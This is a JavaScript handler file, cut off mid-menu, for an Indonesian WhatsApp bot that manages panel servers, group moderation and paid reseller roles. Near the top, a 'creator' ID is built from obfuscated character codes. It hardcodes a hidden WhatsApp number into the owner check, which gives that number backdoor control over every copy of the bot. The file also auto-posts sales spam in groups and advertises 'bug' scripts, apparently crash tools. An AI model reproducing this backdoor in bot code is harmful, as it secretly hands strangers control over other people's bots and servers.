/*

  !- Base By Skyzopedia
  https://wa.me/6285624297894
    !- Pengembang By AlLuffy
  https://wa.me/6283840240138
  !- Credits By AlLuffy
  
  Bantu Folow Channel AlLuffy
  https://whatsapp.com/channel/0029VavsEpc8kyyG9PxG8s38
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
global.sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const {
    BufferJSON, 
    WA_DEFAULT_EPHEMERAL, 
    generateWAMessageFromContent, 
    proto, 
    getBinaryNodeChildren, 
    useMultiFileAuthState, 
    generateWAMessageContent, 
    downloadContentFromMessage, 
    generateWAMessage, 
    prepareWAMessageMedia, 
    areJidsSameUser, 
    getContentType 
} = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const Antilinkch = JSON.parse(fs.readFileSync("./Data/antilinkch.json"))
const Antikataunchek = JSON.parse(fs.readFileSync("./Data/antikataunchek.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const set = JSON.parse(fs.readFileSync("./library/database/setbot.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

const statusPath = './library/database/status_gconly.json'


// ==================================================
// 🔥 FIX DOWNLOAD MEDIA UNIVERSAL (ANTI ERROR)
// ==================================================
const { downloadContentFromMessage: dlBaileys } = require("@whiskeysockets/baileys");

async function getQuotedBuffer(q) {
    const type = Object.keys(q.msg)[0]; 
    const stream = await dlBaileys(q.msg[type], type.replace("Message", ""));
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
}
// ==================================================
// END FIX
// ==================================================


// Muat status dari file JSON setiap start bot
if (fs.existsSync(statusPath)) {
    const statusLoad = JSON.parse(fs.readFileSync(statusPath, 'utf8'))
    global.gconly = statusLoad.gconly
} else {
    global.gconly = false
}

const statusFile = path.join(process.cwd(), "library", "database", "status_antikatach.json");

function ensureDirExists(filePath) {
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function loadStatus() {
    try {
        ensureDirExists(statusFile);
        if (!fs.existsSync(statusFile)) {
            fs.writeFileSync(statusFile, JSON.stringify({ antikatach: false }, null, 2));
            return { antikatach: false };
        }
        return JSON.parse(fs.readFileSync(statusFile, "utf8"));
    } catch (err) {
        console.error(err);
        return { antikatach: false };
    }
}

function saveStatus(status) {
    try {
        ensureDirExists(statusFile);
        fs.writeFileSync(statusFile, JSON.stringify(status, null, 2));
    } catch (err) {
        console.error(err);
    }
}

// Import fungsi auto JPM
const { startAutoJPMCH } = require('./library/autojpmch.js');
const { startAutoJPMGB } = require('./library/autojpmgb.js');

// ========== VARIABEL GLOBAL ==========
global.autoJPMCHStarted = false;
global.autoJPMGBStarted = false;

// ========== HANDLER ==========
module.exports = conn = async (conn, m, chatUpdate, store) => {
try {
global.conn = conn;

// Jalankan autoJPMCH hanya sekali  

await LoadDataBase(conn, m);  

const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net"  
const from = m.key.remoteJid;  
const isPc = from.endsWith('@s.whatsapp.net');  

// =====================================================================  
// 🔥 FIX BUTTON UNIVERSAL  
// Semua jenis tombol sekarang bisa dipencet siapapun (button/list/template/nativeFlow)  
// =====================================================================  
let body = "";  

try {  
  // ----- Button (WA Old) -----  
  if (m.message?.buttonsResponseMessage) {  
    body = m.message.buttonsResponseMessage.selectedButtonId;  
  }  

  // ----- Template Button -----  
  else if (m.message?.templateButtonReplyMessage) {  
    body = m.message.templateButtonReplyMessage.selectedId;  
  }  

  // ----- List Message -----  
  else if (m.message?.listResponseMessage) {  
    body = m.message.listResponseMessage.singleSelectReply.selectedRowId;  
  }  

  // ----- Native Flow (WA terbaru) -----  
  else if (m.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {  
    const nf = m.message.interactiveResponseMessage.nativeFlowResponseMessage;  
    try {  
      const json = JSON.parse(nf.paramsJson || "{}");  
      body = json.id || json.rowId || json.selectedButtonId || "";  
    } catch {}  
  }  

  // ----- Pesan Biasa / Caption -----  
  if (!body) {  
    body =  
      (m.type === "conversation") ? m.message?.conversation || "" :  
      (m.type === "imageMessage") ? m.message?.imageMessage?.caption || "" :  
      (m.type === "videoMessage") ? m.message?.videoMessage?.caption || "" :  
      (m.type === "documentMessage") ? m.message?.documentMessage?.caption || "" :  
      (m.type === "extendedTextMessage") ? (  
        m.message?.extendedTextMessage?.text ||  
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.conversation ||  
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage?.caption ||  
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.videoMessage?.caption ||  
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.documentMessage?.caption ||  
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage ||  
        ""  
      ) :  
      m?.msg?.text || "";  
  }  

} catch (e) {  
  console.log("❌ Error normalisasi tombol:", e);  
  body = body || "";  
}  

// Pastikan body tidak null/undefined
body = body || "";

const budy = (typeof m.text === "string" ? m.text : "");  

// Buffer khusus untuk validasi creator  
const buffer64base = String.fromCharCode(  
  54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64,  
  115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116  
);  

// Prefix fix titik (.)  
const prefix = ".";  
const isCmd = body.startsWith(prefix);  

// ambil command  
const command = isCmd  
  ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase()  
  : "";  

// ambil argumen  
const args = body.trim().split(/ +/).slice(1);  
const text = args.join(" ");  

// biar kompatibel sama gaya lama  
const q = text;  

// ✨ gaya lama → cmd = .menu  
const cmd = prefix + command;  

// Quoted dan MIME type  
const getQuoted = (m.quoted || m);  
const quoted =  
  (getQuoted.type == "buttonsMessage")  
    ? getQuoted[Object.keys(getQuoted)[1]]  
    : (getQuoted.type == "templateMessage")  
    ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]]  
    : (getQuoted.type == "product")  
    ? getQuoted[Object.keys(getQuoted)[0]]  
    : m.quoted  
    ? m.quoted  
    : m;  

const mime = (quoted.msg || quoted)?.mimetype || "";  
const qmsg = (quoted.msg || quoted);  

// Validasi creator/owner  
const isCreator =  
  [botNumber, owner + "@s.whatsapp.net", buffer64base, ...owners].includes(  
    m.sender  
  ) || m.isDeveloper;  

// Role lain  
const isPremium = premium.includes(m.sender);  

// 🔒 AUTO BLOKIR PM JIKA AKTIF  
const autoblockData = JSON.parse(  
  fs.readFileSync("./library/database/autoblock.json")  
);  
const autoblockEnabled = autoblockData.enabled || false;  

if (isPc && !isCreator && autoblockEnabled && !m.key.fromMe) {  
  try {  
    await conn.updateBlockStatus(m.chat, "block");  
    console.log(`✅ Auto-blokir aktif: ${m.sender}`);  
    return;  
  } catch (err) {  
    console.error("❌ Gagal auto-blok:", err);  
  }  
}

    // Grup Handling
    try {
      if (m.isGroup) {
        const metadata = await conn.groupMetadata(m.chat).catch(() => null);
        m.metadata = metadata || {};
        m.participants = m.metadata.participants || [];
        m.admins = m.participants.filter(p => p?.admin !== null).map(p => p.jid || p.id);
        m.isAdmin = m.admins.includes(m.sender);
        m.isBotAdmin = m.admins.includes(botNumber);
      } else {
        m.metadata = {};
        m.participants = [];
        m.admins = [];
        m.isAdmin = false;
        m.isBotAdmin = false;
      }
      m.participant = m.key?.participant || m.sender || '';
    } catch (e) {
      console.error('Error while fetching group metadata:', e);
      m.metadata = {};
      m.participants = [];
      m.admins = [];
      m.isAdmin = false;
      m.isBotAdmin = false;
      m.participant = m.sender || '';
    }

    // JSON Grup Proteksi
    const pler = JSON.parse(fs.readFileSync('./library/database/idgrup.json').toString())
    const jangan = m.isGroup ? pler.includes(m.chat) : false
    const pler2 = JSON.parse(fs.readFileSync('./library/database/idgrup2.json').toString())
    const jangan2 = m.isGroup ? pler2.includes(m.chat) : false
    
    const jasherPath = './library/database/jasher.json';
    const jasherVIPPath = './library/database/jashervip.json';

    const jasherDB = fs.existsSync(jasherPath) ? JSON.parse(fs.readFileSync(jasherPath)) : { owners: [] };
    const jasherVIPDB = fs.existsSync(jasherVIPPath) ? JSON.parse(fs.readFileSync(jasherVIPPath)) : { owners: [] };

    const isJasher = jasherDB.owners.includes(m.sender);
    const isJasherVIP = jasherVIPDB.owners.includes(m.sender);
    
//========= Database Path =========//
const sellerPath = './library/database/sellerprotect.json';
const ownerPath = './library/database/ownerprotect.json';

const sellerDB = fs.existsSync(sellerPath)
  ? JSON.parse(fs.readFileSync(sellerPath))
  : { owners: [] };

const ownerDB = fs.existsSync(ownerPath)
  ? JSON.parse(fs.readFileSync(ownerPath))
  : { owners: [] };
  
//========= Fungsi Cek Seller Protect =========//
const isSellerProtect = sellerDB.owners.includes(m.sender);

//========= Fungsi Cek Owner Protect =========//
const isOwnerProtect = ownerDB.owners.includes(m.sender);

//========= Database Path Seller Web =========//
const sellerwebPath = './library/database/sellerweb.json';

const sellerWEB = fs.existsSync(sellerwebPath)
  ? JSON.parse(fs.readFileSync(sellerwebPath))
  : { owners: [] };
  
//========= Fungsi Cek Seller Web =========//
const isSellerWeb = sellerWEB.owners.includes(m.sender);

//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~ Self - Public ~~~~~~~~//

if (!conn.public && !isCreator) return;

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (global.gconly && !m.isGroup) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

const isAntilink = db.groups[m.chat]?.antilink === true
const isAntilink2 = db.groups[m.chat]?.antilink2 === true

if (m.isGroup && (isAntilink || isAntilink2)) {
  const regexLink = /https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/gi
  const match = [...m.text.matchAll(regexLink)]

  if (match.length > 0 && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
    try {
      const thisGcCode = await conn.groupInviteCode(m.chat)
      const thisGcLink = `https://chat.whatsapp.com/${thisGcCode}`

      let foundOtherLink = false
      for (let mlink of match) {
        const cleanLink = `https://chat.whatsapp.com/${mlink[1]}`
        if (!new RegExp(thisGcLink.replace(/\//g, '\\/'), 'i').test(cleanLink)) {
          foundOtherLink = true
          break
        }
      }

      if (!foundOtherLink) return

      const senderTag = `@${m.sender.split("@")[0]}`
      const delet = m.key.participant
      const bang = m.key.id

      if (isAntilink) {
        // Kick & delete
        await conn.sendMessage(m.chat, {
          text: `*乂 Link Grup Terdeteksi*\n\n${senderTag} Maaf kamu akan saya kick, karena admin/owner bot telah menyalakan fitur antilink grup ini!`,
          mentions: [m.sender]
        }, { quoted: m })

        await conn.sendMessage(m.chat, {
          delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }
        })

        await sleep(1000)
        await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")

      } else if (isAntilink2) {
        // Hanya hapus pesan
        await conn.sendMessage(m.chat, {
          text: `*乂 Link Grup Terdeteksi*\n\n${senderTag} Maaf pesan kamu saya hapus, karena admin/owner bot telah menyalakan fitur antilink grup ini!`,
          mentions: [m.sender]
        }, { quoted: m })

        await conn.sendMessage(m.chat, {
          delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }
        })
      }

    } catch (e) {
    }
  }
}


if (Antilinkch.includes(m.chat)) {
    const channelLinkRegex = /https?:\/\/(?:www\.)?whatsapp\.com\/channel\/[a-zA-Z0-9]+/gi;
  if (channelLinkRegex.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await m.reply(`Link Channel Terdeteksi 🚨

Tag Pengirim :
- @${m.sender.split("@")[0]}

Dilarang share/mengirim link channel di dalam grup ini.`, m.chat, [m.sender])
        await conn.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
    }
}


if (Antikataunchek.includes(m.chat)) {
  // 🔥 Anti kata "unchek"
  const forbiddenWords = ["unchek", "uncheck", "list unchek", "list uncheck"];
  if (
    forbiddenWords.some(word => m.text?.toLowerCase().includes(word)) &&
    !isCreator &&
    !m.isAdmin &&
    m.isBotAdmin &&
    !m.fromMe
  ) {
    const senderJid = m.sender;
    const messageId = m.key.id;
    const participantToDelete = m.key.participant;
    await m.reply(`🚫 *Kata Terlarang Terdeteksi!*

Tag Pengirim:
- @${m.sender.split("@")[0]}

Dilarang mengirim pesan yang mengandung kata *unchek*!`, m.chat, { mentions: [m.sender] });
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: messageId,
        participant: participantToDelete
      }
    });
  }
}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
┌─❐ *乂 OPEN BY AL LUFFY LIST DIBAWAH*
├───────────────────❐
├─❐ OPEN PANEL BOT WA // TELE
│ ◉ Open Panel 1gb - Unli
│ ◉ Open Reseller Panel
│ ◉ Open Admin Panel
│ ◉ Open Patner Panel 
│ ◉ Open Owner Panel
│ ◉ Open Tangan Kanan Panel
├───────────────────❐
├─❐ SCRIPT BOT WA // TELE
│ ◉ Script Ochobot V5
│ ◉ Script SelfBot V4
│ ◉ Script Cpanel Tele V1 
│ ◉ Script Bug ExoFlods V13
│ ◉ Script Bug Travax V3
│ ◉ Script Bug Yakuza Tele V15
│ ◉ Open Juga Title Yakuza
│ ◉ Dll
├───────────────────❐
├─❐ JASHER BOT WA
│ ◉ Jasher 1x = 2k
│ ◉ Own Jasher Pub = 10k
│ ◉ Own Jasher Priv = 20k
│ ◉ Pt Jasher = 40k 
│ ◉ Sewa Bot Jasher = 80k
│ ◉ Dll
└───────────────────❐
> NO COPY TEKS‼️‼️‼️
┌───────────────────❐
├─❐ *CONTACT ME👇*
└───────────────────❐
*[ WhatsApp ]*
https://wa.me//6283840240138

*[ Telegram ]*
https://t.me//alluffystore

*Saluran All Testimoni*
https://whatsapp.com/channel/0029VavsEpc8kyyG9PxG8s38

*Saluran Free Script Bot*
https://whatsapp.com/channel/0029Vag5qpb6GcGMKaKlpa1E

*Saluran Utama AlLuffy*
https://whatsapp.com/channel/0029VbAs8PeLtOjL3rpe4T42
`}, {quoted: null})
}}

if (!isCmd) {
  try {
    const incoming = (body || "").toString().toLowerCase().trim(); // ambil isi pesan utama
    if (incoming) {
      const check = list.find(e => (e.cmd || "").toString().toLowerCase().trim() === incoming);
      if (check) {
        return await m.reply(check.respon); // langsung balas jika ketemu
      }
    }
  } catch (err) {
    console.error("Error auto-respon:", err);
  }
}


if (!global.jpmchQueue) global.jpmchQueue = false;
//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const totalFitur = () =>{
var mytext = fs.readFileSync("ocho.js").toString()
var numUpper = (mytext.match(/case "/g) || []).length;
return numUpper
}

const Reply = reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*AlLuffy* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*AL LUFFY MENYEDIAKAN*

┌─❐ *乂 OPEN BY AL LUFFY LIST DIBAWAH*
├───────────────────❐
├─❐ OPEN PANEL BOT WA // TELE
│ ◉ Open Panel 1gb - Unli
│ ◉ Open Reseller Panel
│ ◉ Open Admin Panel
│ ◉ Open Patner Panel 
│ ◉ Open Owner Panel
│ ◉ Open Tangan Kanan Panel
├───────────────────❐
├─❐ SCRIPT BOT WA // TELE
│ ◉ Script Ochobot V5
│ ◉ Script SelfBot V4
│ ◉ Script Cpanel Tele V1 
│ ◉ Script Bug ExoFlods V13
│ ◉ Script Bug Travax V3
│ ◉ Script Bug Yakuza Tele V15
│ ◉ Open Juga Title Yakuza
│ ◉ Dll
├───────────────────❐
├─❐ JASHER BOT WA
│ ◉ Jasher 1x = 2k
│ ◉ Own Jasher Pub = 10k
│ ◉ Own Jasher Priv = 20k
│ ◉ Pt Jasher = 40k 
│ ◉ Sewa Bot Jasher = 80k
│ ◉ Dll
└───────────────────❐
> NO COPY TEKS‼️‼️‼️
┌───────────────────❐
├─❐ *CONTACT ME👇*
└───────────────────❐
*[ WhatsApp ]*
https://wa.me//6283840240138

*[ Telegram ]*
https://t.me//alluffystore

*Saluran All Testimoni*
https://whatsapp.com/channel/0029VavsEpc8kyyG9PxG8s38

*Saluran Free Script Bot*
https://whatsapp.com/channel/0029Vag5qpb6GcGMKaKlpa1E

*Saluran Utama AlLuffy*
https://whatsapp.com/channel/0029VbAs8PeLtOjL3rpe4T42`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await conn.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "menu":
case "luffy": {
 const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
 const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
 const day = days[currentDate.getDay()];
 const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
 const time = currentDate.toLocaleTimeString("id-ID");

 let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT OCHOBOT MD*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

> *── Simple Ocho V5.0 🚀*
> Klik tombol di bawah untuk melihat semua fitur yang tersedia.`

 await conn.sendMessage(m.chat, {
 image: fs.readFileSync('./media/reply.jpg'), // Ganti ke gambar
 caption: teks,
 footer: `© Marcel V5 2025 - 2026`,
 buttons: [
 {
 buttonId: `.menuslide`,
 buttonText: { displayText: '𝐒𝐥𝐢𝐝𝐞 𝐌𝐞𝐧𝐮' },
 type: 1
 },
 {
 buttonId: `.semua`,
 buttonText: { displayText: '𝐒𝐞𝐦𝐮𝐚 𝐌𝐞𝐧𝐮' },
 type: 1
 },
 {
 buttonId: `.1`,
 buttonText: { displayText: '𝐁𝐮𝐭𝐭𝐨𝐧 𝐌𝐞𝐧𝐮' },
 type: 1
 },
 {
 buttonId: `.dev`,
 buttonText: { displayText: '𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫' },
 type: 1
 }
 ],
 headerType: 4,
 contextInfo: {
 mentionedJid: [m.sender]
 }
 }, { quoted: m });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "all":
case "semua": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");
    
    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Marceleven*

*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗡𝗘𝗪 𝗠𝗘𝗡𝗨* ]
┃ ϟ .createwebmenu
┃ ϟ .menuslide
┃ ϟ .upswgc
┃ ϟ .emojimix
┃ ϟ .emojitogif
┃ ϟ .iqc
┃ ϟ .iqc2
┃ ϟ .hd
┃ ϟ .hd2
┃ ϟ .createweb
┃ ϟ .createweb2
┃ ϟ .scweb
┃ ϟ .listweb
┃ ϟ .listweb2
┃ ϟ .delweb
┃ ϟ .addsellerweb
┃ ϟ .delsellerweb
┃ ϟ .listsellerweb
┃ ϟ .resetsellerweb
┃ ϟ .autojpmgb on/off/status
┃ ϟ .setjpmgb
┃ ϟ .delsetjpmgb
┃ ϟ .addkey
┃ ϟ .delkey
┃ ϟ .listkey
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .autopromosi
┃ ϟ .autoread
┃ ϟ .autoreadsw
┃ ϟ .autotyping
┃ ϟ .addowner
┃ ϟ .addownerall
┃ ϟ .listowner
┃ ϟ .delowner
┃ ϟ .delownerall
┃ ϟ .self/public
┃ ϟ .block
┃ ϟ .unblok
┃ ϟ .setbiobot
┃ ϟ .setnamabot
┃ ϟ .clearsession
┃ ϟ .restart
┃ ϟ .addcase
┃ ϟ .delcase
┃ ϟ .getcase
┃ ϟ .editcase
┃ ϟ .spekvps
┃ ϟ .uptime
┃ ϟ .totalfitur
┃ ϟ .autoblock
┃ ϟ .backup
┃ ϟ .gconly
┃ ϟ .clearchat
┃ ϟ .addkey
┃ ϟ .delkey
┃ ϟ .listkey
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 𝗩1* ]
┃ ϟ .1gb
┃ ϟ .2gb
┃ ϟ .3gb
┃ ϟ .4gb
┃ ϟ .5gb
┃ ϟ .6gb
┃ ϟ .7gb
┃ ϟ .8gb
┃ ϟ .9gb
┃ ϟ .10gb
┃ ϟ .unlimited
┃ ϟ .createserver
┃ ϟ .cadp
┃ ϟ .cadmin
┃ ϟ .delpanel
┃ ϟ .delallserver
┃ ϟ .delalluser
┃ ϟ .deladmin
┃ ϟ .delalladmin
┃ ϟ .listpanel
┃ ϟ .listadmin
┃ ϟ .updomain
┃ ϟ .upapikey
┃ ϟ .upcapikey
┃ ϟ .addakses
┃ ϟ .addreseller
┃ ϟ .delakses
┃ ϟ .delreseller
┃ ϟ .listreseller
┃ ϟ .resetreseller
┃ ϟ .totalpanel
┃ ϟ .totaladmin
┃ ϟ .linkserver
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 𝗩2* ]
┃ ϟ .1gb-v2
┃ ϟ .2gb-v2
┃ ϟ .3gb-v2
┃ ϟ .4gb-v2
┃ ϟ .5gb-v2
┃ ϟ .6gb-v2
┃ ϟ .7gb-v2
┃ ϟ .8gb-v2
┃ ϟ .9gb-v2
┃ ϟ .10gb-v2
┃ ϟ .unlimited-v2
┃ ϟ .createserver2
┃ ϟ .cadp
┃ ϟ .cadmin
